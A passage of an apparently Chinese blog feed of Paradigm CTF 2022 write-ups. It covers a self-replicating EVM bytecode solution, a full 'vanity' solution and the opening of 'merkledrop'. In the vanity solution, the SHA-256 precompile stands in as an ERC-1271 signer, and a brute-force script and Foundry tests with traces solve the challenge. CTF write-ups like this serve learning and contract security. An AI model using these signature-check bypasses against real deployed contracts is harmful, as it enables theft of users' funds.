REVERT</span><br></pre></td></tr></table></figure><p>这么一来，对我们来说，本题能做点事情的操作码也就这么几个了：DUP?、MSTORE、RETURN、PUSH?</p><p>那么构造操作码的思路是怎么样呢？有种想法是将整个code作为参数压入栈中，然后放到memory，最后用return从memory返回。但是这么做，除了参数还有压入、放到、返回这一系列操作，会让code递归膨胀修改，不可行。</p><p>可行的思路：我们压入栈的参数只是我们执行的操作码，我们称他为logic code，那么我们logic code就有两份（一份是作为参数压栈，一份是实际执行的），然后返回的是两份logic code。大概流程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PUSH?(?是logic code的长度) logic code</span><br><span class="line"></span><br><span class="line">//////// 以下为整个所有的logic code //////</span><br><span class="line"></span><br><span class="line">DUP1（复制logic code）</span><br><span class="line"></span><br><span class="line">PUSH 01 （01是logic code要存位置的offset，后面32字节内容全是logic code。push 01的原因是要留给PUSH?）</span><br><span class="line">MSTORE（将logic code存进memory，并且栈中也有一段logic code）</span><br><span class="line"></span><br><span class="line">PUSH offset（第二段logic code内存地址的offset）</span><br><span class="line">MSTORE （把栈中的第二段logic code也存进内存）</span><br><span class="line"></span><br><span class="line">PUSH PUSH? (这里需要注意，因为最后要返回的code中也包含PUSH?)</span><br><span class="line">PUSH 00（PUSH?存入的位置）</span><br><span class="line">MSTORE8（MSTORE8,之所以不用MSTORE，是因为MSTORE存入了一个uint256的值，会留出大量0,而mstore只一个字节一个字节的操作，刚好符合PUSH?）</span><br><span class="line"></span><br><span class="line">PUSH 41 （也就是1+32+32，也就是PUSH? + logic code + logic code的长度）</span><br><span class="line">PUSH 00 （从0位置开始复制）</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>但是，我们知道，绝大部分是每32字节来处理的，不足位置补0，并且由于我们存入的是数值因此会把数据从低位开始存，但是如果执行0就是执行stop，因此我们要用一些执行了但是任何效果都没有的操作码来代替0，选择5b[ JUMPDEST ]：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">7f( PUSH32 ) 5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f3</span><br><span class="line"></span><br><span class="line">//////// 以下为整个所有的logic code //////</span><br><span class="line">填充，需要填充的个数 = 32 - logic code的长度，这里啥也不干，只是为了对应上面的补5b操作</span><br><span class="line">5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b</span><br><span class="line"></span><br><span class="line">80（DUP1）</span><br><span class="line"></span><br><span class="line">60 01（01是logic code要存位置的offset，后面32字节内容全是logic code。push 01的原因是要留给PUSH32）</span><br><span class="line">52（MSTORE）</span><br><span class="line"></span><br><span class="line">60 21（也就是33字节，拼接的offset）</span><br><span class="line">52（MSTORE，写进内存）</span><br><span class="line"></span><br><span class="line">60 7f (这里需要注意，因为最后要返回的code中也包含PUSH32，也就是7f，所以要再前面为7f也存进去)</span><br><span class="line">60 00（7f存入的位置）</span><br><span class="line">53（MSTORE8,之所以不用MSTORE，是因为MSTORE存入了一个uint256的值，会留出大量0,而mstore只一个字节一个字节的操作，刚好符合7f）</span><br><span class="line"></span><br><span class="line">60 41 （整段代码长度）</span><br><span class="line">60 00 （返回值起始位置，从00开始）</span><br><span class="line">f3 （RETURN）</span><br></pre></td></tr></table></figure><p>也就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7f    5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f3</span><br><span class="line"></span><br><span class="line">5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f3</span><br></pre></td></tr></table></figure><p>即：7f5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f35b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f3</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;../../src/06.sourcecode/Setup.sol&quot;;</span><br><span class="line">import &quot;../../src/06.sourcecode/Challenge.sol&quot;;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract sourcecodeTest is Test&#123;</span><br><span class="line"></span><br><span class="line">    Setup level;</span><br><span class="line">    Challenge challenge;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        level = new Setup();</span><br><span class="line">        challenge = level.challenge();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isSolved() public &#123;</span><br><span class="line">        IChallenge(address(challenge)).solve(</span><br><span class="line">            abi.encodePacked(</span><br><span class="line">                hex&quot;7f5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f35b5b5b5b5b5b5b5b5b5b5b5b5b5b5b80600152602152607f60005360416000f3&quot;)</span><br><span class="line">        );</span><br><span class="line">        assertEq(level.isSolved(),true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IChallenge&#123;</span><br><span class="line">    function solve(bytes memory ) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 14.Paradigm CTF 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.vanity</title>
      <link href="/2023/09/18/14.Paradigm%20CTF%202022/05.vanity/"/>
      <url>/2023/09/18/14.Paradigm%20CTF%202022/05.vanity/</url>
      
        <content type="html"><![CDATA[<h1 id="vanity"><a href="#vanity" class="headerlink" title="vanity"></a>vanity</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>题目给了5个合约，其实挺简单：</p><ul><li>SignatureChecker.sol：一个检查签名的library</li><li>Setup.sol：初始化题目和设置题目完成的条件</li><li>IERC1271.sol<ul><li>一个非常简单的接口</li></ul></li><li>ECDSA.sol<ul><li>ECDSA库</li></ul></li><li>Challenge.sol<ul><li>题目的核心部分，给了三个方法，只有两个可以调用，提供数据，要求地址至少包含16个0字节</li></ul></li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>从下面的代码可以看出，我们需要调用<code>solve()</code>或者<code>solve(address, bytes)</code> ，然后使得bestScore大于等于16。也就是一个地址至少包含16个0字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() external view returns (bool) &#123;</span><br><span class="line">    return challenge.bestScore() &gt;= 16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract Challenge &#123;</span><br><span class="line">    // 0x19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528</span><br><span class="line">    bytes32 private immutable MAGIC = keccak256(abi.encodePacked(&quot;CHALLENGE_MAGIC&quot;));</span><br><span class="line"></span><br><span class="line">    uint public bestScore;</span><br><span class="line"></span><br><span class="line">    function solve() external &#123;</span><br><span class="line">        solve(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve(address signer, bytes memory signature) external &#123;</span><br><span class="line">        require(SignatureChecker.isValidSignatureNow(signer, MAGIC, signature), &quot;Challenge/invalidSignature&quot;);</span><br><span class="line"></span><br><span class="line">        solve(signer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve(address who) private &#123;</span><br><span class="line">        uint score = 0;</span><br><span class="line"></span><br><span class="line">        for (uint i = 0; i &lt; 20; i++) if (bytes20(who)[i] == 0) score++;</span><br><span class="line"></span><br><span class="line">        if (score &gt; bestScore) bestScore = score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><h4 id="3-1初探突破口"><a href="#3-1初探突破口" class="headerlink" title="3.1初探突破口"></a>3.1初探突破口</h4><p><code>solve()</code>函数是要求msg.sender至少包含16个0字节，显示不可能，因此只能寄希望于<code>solve(address, bytes)</code>。从这个方法又调用了<code>isValidSignatureNow()</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function isValidSignatureNow(</span><br><span class="line">    address signer,</span><br><span class="line">    bytes32 hash,</span><br><span class="line">    bytes memory signature</span><br><span class="line">) internal view returns (bool) &#123;</span><br><span class="line">    (address recovered, ECDSA.RecoverError error) = ECDSA.tryRecover(hash, signature);</span><br><span class="line">    if (error == ECDSA.RecoverError.NoError &amp;&amp; recovered == signer) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    (bool success, bytes memory result) = signer.staticcall(</span><br><span class="line">        abi.encodeWithSelector(IERC1271.isValidSignature.selector, hash, signature)</span><br><span class="line">    );</span><br><span class="line">    return (success &amp;&amp; result.length == 32 &amp;&amp; abi.decode(result, (bytes4)) == IERC1271.isValidSignature.selector);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上半部分，调用了ecdsa库函数的<code>tryRecover()</code>函数，传入一个hash常量，一个签名的字符串，返回一个签名者的地址，要求签名者的地址和传入的signer地址相等。但是hash不可控，是一个常量，由于哈希算法的特性我们无法找到一个有效的签名可以通过验证，这一步走不通。</p><p>下半部分，对传入地址signer的staticcall调用。把函数签名、hash、签名内容这三个东西进行abi编码之后传入。要求staticcall返回内容的长度是32字节，返回的bytes32转化成bytes4(也就是高位截断之后的前4字节)，这前4个字节要等于isValidSignature的函数签名——也就是说，这个signer要求至少16个字节的内容都是0，然后要求调用之后返回32字节的内容，并且返回内容等于一个已知常量。这也是我们唯一的出路了。 </p><h4 id="3-2唯一出路"><a href="#3-2唯一出路" class="headerlink" title="3.2唯一出路"></a>3.2唯一出路</h4><p>要一个地址有至少16个字节都是0，容易想到evm预编译。首先这个预编译合约它是不在链上的，这部分内容集成在每个节点上，因为调用频繁，所以不在链上计算，节约成本。 具体文档参照: <a href="https://www.evm.codes/precompiled。首先这些个预编译合约的地址前面有很多0，满足条件，但是还需要找一个调用返回bytes32的。">https://www.evm.codes/precompiled。首先这些个预编译合约的地址前面有很多0，满足条件，但是还需要找一个调用返回bytes32的。</a> </p><p><img src="https://moe.photo/images/2023/07/25/image-20230725141547705.png" alt></p><p>发现只有0x2合适，输入任意长度的内容，进行SHA2-256算法，注意！是SHA2-256算法而不是SHA3-256，因为很多在线网站的加密都省略了SHA3而直接说是SHA256算法，因此撞坑了，用这个<a href="https://the-x.cn/zh-cn/hash/SecureHashAlgorithm.aspx">网站</a>，他有SHA2-256，并且一定要选择<code>HEX/BASE16</code>。返回的内容是32字节。</p><p>也就是说，任何内容只要输入0x2合约，那么0x2合约就只会执行SHA-256方法对内容进行hash</p><p>那现在这个问题就转化了。首先传一个0x2的地址，符合要求，还需要传入一个bytes字符串。然后把<code>isValidSignature()</code>的函数签名、hash常量、外部传入的bytes字符串，这3个东西进行abi编码之后，做一个SHA2-256计算，要求返回结果的前4个字节是isValidSignature的函数签名，即：<code>0x1626ba7e</code>。然后编码情况大概如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 1626ba7e // IERC1271.isValidSignature.selector：isValidSignature(bytes32,bytes meomry)</span><br><span class="line">// 19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528 // MAGIC</span><br><span class="line">// 0000000000000000000000000000000000000000000000000000000000000040 // 实际数据的offset</span><br><span class="line">// 0000000000000000000000000000000000000000000000000000000000000020 // 取数据长度0x20字节(高位算起)</span><br><span class="line">// 实际签名数据，要填充到32字节</span><br></pre></td></tr></table></figure><p>因为有部分内容是固定的，我们所需要做的是，将实际的签名数据不断变化，直到hash结果符合条件，进行爆破：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数值从10进制转换为16进制，然后补0</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decimalToHex</span>(<span class="params">d, padding</span>) &#123;</span><br><span class="line">    <span class="comment">// 转为16进制</span></span><br><span class="line">    <span class="keyword">var</span> hex = <span class="title class_">Number</span>(d).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">    padding = <span class="keyword">typeof</span> (padding) === <span class="string">&quot;undefined&quot;</span> || padding === <span class="literal">null</span> ? padding = <span class="number">2</span> : padding;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在前面补0</span></span><br><span class="line">    <span class="keyword">while</span> (hex.<span class="property">length</span> &lt; padding) &#123;</span><br><span class="line">        hex = <span class="string">&quot;0&quot;</span> + hex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hex;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> baseStr = <span class="string">&quot;1626ba7e19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb52800000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000020&quot;</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 1626ba7e // IERC1271.isValidSignature.selector：isValidSignature(bytes32,bytes meomry)</span></span><br><span class="line"><span class="comment">// 19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528 // MAGIC</span></span><br><span class="line"><span class="comment">// 0000000000000000000000000000000000000000000000000000000000000040 // 实际数据的offset</span></span><br><span class="line"><span class="comment">// 0000000000000000000000000000000000000000000000000000000000000020 // 取数据长度0x20字节(高位算起)</span></span><br><span class="line"><span class="comment">// 实际签名数据，要填充到32字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最多跑多少</span></span><br><span class="line"><span class="keyword">var</span> max = <span class="number">2</span>**<span class="number">32</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt; max; i++) &#123;</span><br><span class="line">    <span class="comment">// 获取sha256加密算法</span></span><br><span class="line">    <span class="keyword">var</span> obj=crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha256&#x27;</span>);</span><br><span class="line">    <span class="comment">// 每一轮实际的签名数据</span></span><br><span class="line">    <span class="keyword">var</span> nonceStr = <span class="title function_">decimalToHex</span>(i, <span class="number">64</span>);</span><br><span class="line">    <span class="comment">// 拼接</span></span><br><span class="line">    <span class="keyword">var</span> str = baseStr + nonceStr;</span><br><span class="line">    <span class="comment">// 转为buff</span></span><br><span class="line">    <span class="keyword">var</span> buf = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(str, <span class="string">&quot;hex&quot;</span>)</span><br><span class="line">    <span class="comment">// 看不懂</span></span><br><span class="line">    obj.<span class="title function_">update</span>(buf)</span><br><span class="line"><span class="comment">// 看不懂</span></span><br><span class="line">    <span class="keyword">var</span> res = obj.<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="comment">// 找到</span></span><br><span class="line">    <span class="keyword">if</span> (res.<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">8</span>) == <span class="string">&#x27;1626ba7e&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;find&#x27;</span>, i, nonceStr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 打桩</span></span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">1000000</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(i, nonceStr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终，程序跑了三个小时我日（10835.736 秒 = 180.5956 分钟），终于输出了如下结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find 3341776893 00000000000000000000000000000000000000000000000000000000c72f77fd</span><br><span class="line"></span><br><span class="line">[Done] exited with code=0 in 10835.736 seconds</span><br></pre></td></tr></table></figure><p>最终我们得到了一个有效的签名：<code>00000000000000000000000000000000000000000000000000000000c72f77fd</code></p><p>然后整理如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1626ba7e19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb5280000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000c72f77fd</span><br><span class="line"></span><br><span class="line">整理</span><br><span class="line">1626ba7e</span><br><span class="line">19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000040</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000020</span><br><span class="line">00000000000000000000000000000000000000000000000000000000c72f77fd</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.5.0; // 注意版本，一些库的版本很低，foundry无法通过编译</span><br><span class="line"></span><br><span class="line">import &quot;../../src/05.vanity/Setup.sol&quot;;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/05.vanity/Challenge.sol&quot;;</span><br><span class="line">pragma abicoder v2; // foundry提示说要添加这个否则不兼容</span><br><span class="line"></span><br><span class="line">contract vanityTest is Test&#123;</span><br><span class="line"></span><br><span class="line">    Setup level;</span><br><span class="line">    Challenge challenge;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        level = new Setup();</span><br><span class="line">        challenge = level.challenge();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isSolved() public &#123;</span><br><span class="line">        // 解法1：</span><br><span class="line">        //IChallenge(address(challenge)).solve(address(0x0000000000000000000000000000000000000002), hex&quot;8cf1a8bb&quot;);</span><br><span class="line">        // 解法2：</span><br><span class="line">        IChallenge(address(challenge)).solve(address(0x0000000000000000000000000000000000000002), abi.encodePacked(uint256(3341776893)));</span><br><span class="line">        assertEq(level.isSolved(),true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IChallenge&#123;</span><br><span class="line">    function solve(address , bytes memory ) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案并不唯一，网上另外一个答案8cf1a8bb应该是不同的爆破方法算出来的，签名不一样，但是结果一样，它的输入是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1626ba7e</span><br><span class="line">19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000040</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000004 // 取数据长度4字节(高位算起)</span><br><span class="line">8cf1a8bb00000000000000000000000000000000000000000000000000000000 // 实际签名数据</span><br></pre></td></tr></table></figure><p>我的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1626ba7e</span><br><span class="line">19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000040</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000020 // 取数据长度0x20字节(高位算起)</span><br><span class="line">00000000000000000000000000000000000000000000000000000000c72f77fd // 实际签名数据</span><br><span class="line"></span><br><span class="line">结果：1626BA7EEB6B28B0484CB0562A5AEB2004E5F6A5C63E04AE3FA810950D1BC251</span><br></pre></td></tr></table></figure><p>因此，一个版本是取前4字节的内容，一个版本是取前0x20字节的内容，我的是后者。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Traces:</span><br><span class="line">  [38820] vanityTest::test_isSolved() </span><br><span class="line">    ├─ [27413] Challenge::solve(0x0000000000000000000000000000000000000002, 0x8cf1a8bb) </span><br><span class="line">    │   ├─ [120] PRECOMPILE::sha256(1626ba7e19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000048cf1a8bb00000000000000000000000000000000000000000000000000000000) [staticcall]</span><br><span class="line">    │   │   └─ ← 0x1626ba7e11c9fdc6c495f346beb65e2f712676389ec7733846f0457a36113dc1</span><br><span class="line">    │   └─ ← ()</span><br><span class="line">    ├─ [853] 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f::isSolved() [staticcall]</span><br><span class="line">    │   ├─ [276] Challenge::bestScore() [staticcall]</span><br><span class="line">    │   │   └─ ← 19</span><br><span class="line">    │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001</span><br><span class="line">    └─ ← ()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 14.Paradigm CTF 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.merkledrop</title>
      <link href="/2023/09/18/14.Paradigm%20CTF%202022/04.merkledrop/"/>
      <url>/2023/09/18/14.Paradigm%20CTF%202022/04.merkledrop/</url>
      
        <content type="html"><![CDATA[<h1 id="merkledrop"><a href="#merkledrop" class="headerlink" title="merkledrop"></a>merkledrop</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-任务"><a href="#1-任务" class="headerlink" title="1.任务"></a>1.任务</h3><p>本题关于merkle树，题目将75000个代币空投到merkleDistributor中，然后完成题目的条件有两个：</p><ul><li>merkleDistributor的余额为0</li><li>merkle树的64个节点中，至少有一个节点没有取过钱</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">contract Setup &#123;</span><br><span class="line"></span><br><span class="line">    Token public immutable token;</span><br><span class="line">    MerkleDistributor public immutable merkleDistributor;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        token = new Token();</span><br><span class="line">        uint256 airdropAmount = 75000 * 10 ** 18;</span><br><span class="line">        merkleDistributor = new MerkleDistributor(</span><br><span class="line">            address(token), </span><br><span class="line">            bytes32(0x5176d84267cd453dad23d8f698d704fc7b7ee6283b5131cb3de77e58eb9c3ec3)</span><br><span class="line">        );</span><br><span class="line">        token.transfer(address(merkleDistributor), airdropAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        bool condition1 = token.balanceOf(address(merkleDistributor)) == 0;</span><br><span class="line">        bool condition2 = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; 64; ++i) &#123;</span><br><span class="line">            if (!merkleDistributor.isClaimed(i)) &#123;</span><br><span class="line">                condition2 = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return condition1 &amp;&amp; condition2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-全局观"><a href="#2-全局观" class="headerlink" 